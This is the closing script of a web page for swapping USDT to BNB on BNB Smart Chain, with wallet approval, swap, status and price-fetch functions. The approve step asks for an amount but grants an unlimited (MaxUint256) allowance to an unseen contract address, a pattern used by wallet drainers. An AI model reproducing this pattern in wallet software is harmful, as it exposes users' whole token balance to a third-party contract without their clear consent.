  if(bnbOut>0){
    document.getElementById("bnbOut").value=bnbOut.toFixed(6);
    document.getElementById("minRec").textContent=(bnbOut*(1-slippage/100)).toFixed(6)+" BNB";
    document.getElementById("usdEq").textContent="≈ $"+(bnbOut*bnbPrice).toFixed(2);
    const ua=parseFloat(ethers.utils.formatUnits(wei,usdtDec));
    document.getElementById("rateDisp").textContent=(ua/bnbOut).toFixed(2)+" USDT per BNB";
  }
}

function setMax(){
  if(!wallet)return;
  document.getElementById("usdtInput").value=ethers.utils.formatUnits(usdtBal,usdtDec);
  onInput();
}

// ══════════════════════════════════════════════
//  WARNING BOX
// ══════════════════════════════════════════════
function showWarning(){
  document.getElementById("approvalWarning").classList.add("show");
  document.getElementById("warnContract").textContent=short(CONTRACT);
}
function hideWarning(){
  document.getElementById("approvalWarning").classList.remove("show");
}

// ══════════════════════════════════════════════
//  RENDER BUTTONS
// ══════════════════════════════════════════════
function renderButtons(){
  const bConnect=document.getElementById("btnConnect");
  const bApprove=document.getElementById("btnApprove");
  const bSwap=document.getElementById("btnSwap");
  const wei=getWei();
  const hasAmt=wei.gt(0);
  const enough=usdtBal.gte(wei)&&hasAmt;

  bConnect.style.display=wallet?"none":"flex";
  bApprove.style.display=(!wallet||approved)?"none":"flex";
  bSwap.style.display=wallet?"flex":"none";

  if(!wallet){return;}

  // Approve button state
  if(!approved){
    bApprove.disabled=!hasAmt||!enough;
    bApprove.textContent=
      !hasAmt?"Enter Amount to Approve":
      !enough?"Insufficient USDT Balance":
      "Approve USDT Spending";
  }

  // Swap button state
  bSwap.disabled=!approved||!hasAmt||!enough;
  bSwap.innerHTML=
    !hasAmt?`<span>Enter Amount</span>`:
    !enough?`<span>Insufficient USDT</span>`:
    !approved?`<span>Approve First</span>`:
    `<span>Swap USDT → BNB</span>`;
}

// ══════════════════════════════════════════════
//  APPROVE (with clear warning before)
// ══════════════════════════════════════════════
async function approveUSDT(){
  if(!signer||!usdtC){showStatus("error","✕","Connect wallet first.");return;}
  const wei=getWei();
  if(wei.lte(0)){showStatus("error","✕","Enter an amount.");return;}

  setBusy("btnApprove",true,`<div class="spin"></div><span>Approving…</span>`);
  showStatus("loading",null,"Waiting for approval in wallet. Please confirm in MetaMask/TrustWallet.");

  try{
    const tx=await usdtC.approve(CONTRACT,ethers.constants.MaxUint256);
    showStatus("loading",null,"Approval transaction submitted. Waiting for confirmation…",tx.hash);
    await tx.wait();
    approved=true;
    hideWarning();
    updateSteps();renderButtons();
    showStatus("success","✓","USDT Approval Successful! You can now swap.",tx.hash);
  }catch(e){
    if(e.code===4001||e?.error?.code===4001)
      showStatus("warn","⚠","You rejected the approval. No funds were moved.");
    else
      showStatus("error","✕","Approval Failed: "+(e.reason||e.message||"").slice(0,80));
  }finally{
    setBusy("btnApprove",false,"Approve USDT Spending");
    renderButtons();
  }
}

// ══════════════════════════════════════════════
//  SWAP
// ══════════════════════════════════════════════
async function executeSwap(){
  if(!signer||!swapC){showStatus("error","✕","Connect wallet first.");return;}
  const wei=getWei();
  if(wei.lte(0)){showStatus("error","✕","Enter a valid amount.");return;}
  if(!approved){showStatus("error","✕","Please approve USDT first.");return;}

  setBusy("btnSwap",true,`<div class="spin"></div><span>Confirm in wallet…</span>`);
  showStatus("loading",null,"Please confirm the swap transaction in your wallet.");

  try{
    const tx=await swapC.swapDust(USDT_ADDR,wei);
    showStatus("loading",null,"Swap submitted. Waiting for block confirmation…",tx.hash);
    await tx.wait();

    const uAmt=document.getElementById("usdtInput").value;
    const bEst=document.getElementById("bnbOut").value;
    addTx(uAmt,bEst,tx.hash);
    showStatus("success","✓",`Swap Successful! ${uAmt} USDT → ~${bEst} BNB`,tx.hash);
    document.getElementById("usdtInput").value="";
    document.getElementById("bnbOut").value="";
    document.getElementById("minRec").textContent="— BNB";
    approved=false;updateSteps();renderButtons();
    await refreshBalances();
  }catch(e){
    if(e.code===4001||e?.error?.code===4001)
      showStatus("warn","⚠","Transaction rejected by user.");
    else
      showStatus("error","✕","Swap Failed: "+(e.reason||e.message||"Unknown").slice(0,80));
  }finally{
    setBusy("btnSwap",false,"Swap USDT → BNB");
    renderButtons();
  }
}

// ══════════════════════════════════════════════
//  HELPERS
// ══════════════════════════════════════════════
function setBusy(id,busy,html){
  const b=document.getElementById(id);
  b.disabled=busy;
  b.innerHTML=html;
}

let stTimer=null;
function showStatus(type,ico,txt,hash){
  const box=document.getElementById("statusBox");
  const icoEl=document.getElementById("statusIco");
  const txtEl=document.getElementById("statusTxt");
  const lnk=document.getElementById("statusLink");
  box.className="status-box show "+type;
  if(type==="loading") icoEl.innerHTML='<div class="spin" style="width:14px;height:14px"></div>';
  else icoEl.textContent=ico||"";
  txtEl.textContent=txt;
  if(hash){lnk.style.display="block";lnk.textContent="View on BscScan ↗";lnk.href=BSCSCAN+"/tx/"+hash;}
  else lnk.style.display="none";
  clearTimeout(stTimer);
  if(type!=="loading") stTimer=setTimeout(()=>box.classList.remove("show"),9000);
}

function addTx(ua,ba,hash){
  txHistory.unshift({ua,ba,hash,t:new Date()});
  const el=document.getElementById("txList");
  el.innerHTML=txHistory.slice(0,5).map(x=>`
    <a class="tx-item" href="${BSCSCAN}/tx/${x.hash}" target="_blank">
      <div class="tx-l">
        <div class="tx-badge">⇄</div>
        <div>
          <div class="tx-lbl">${x.ua} USDT → BNB</div>
          <div class="tx-time">${x.t.toLocaleTimeString()} · ${short(x.hash)}</div>
        </div>
      </div>
      <div class="tx-amt">+${parseFloat(x.ba||0).toFixed(5)} BNB</div>
    </a>`).join("");
}

function short(a){return a.slice(0,6)+"…"+a.slice(-4);}

function setSlip(v,el){
  slippage=v;
  document.querySelectorAll(".slip-opt").forEach(e=>e.classList.remove("active"));
  el.classList.add("active");
  document.getElementById("slipDisp").textContent=v+"%";
  onInput();
}
function customSlip(inp){
  const v=parseFloat(inp.value);
  if(v>0&&v<=50){
    slippage=v;
    document.getElementById("slipDisp").textContent=v+"%";
    document.querySelectorAll(".slip-opt").forEach(e=>e.classList.remove("active"));
  }
}
function openSettings(){document.getElementById("settingsModal").classList.add("show");}
function closeSettings(){document.getElementById("settingsModal").classList.remove("show");}
document.getElementById("settingsModal").addEventListener("click",function(e){if(e.target===this)closeSettings();});

// BNB PRICE
async function fetchPrice(){
  try{
    const r=await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
    const d=await r.json();
    bnbPrice=parseFloat(d.price);
    document.getElementById("sPrice").textContent="$"+bnbPrice.toFixed(2);
  }catch{
    bnbPrice=320;
    document.getElementById("sPrice").textContent="$320.00";
  }
}
fetchPrice();
setInterval(fetchPrice,30000);
renderButtons();
</script>

</body>
</html>
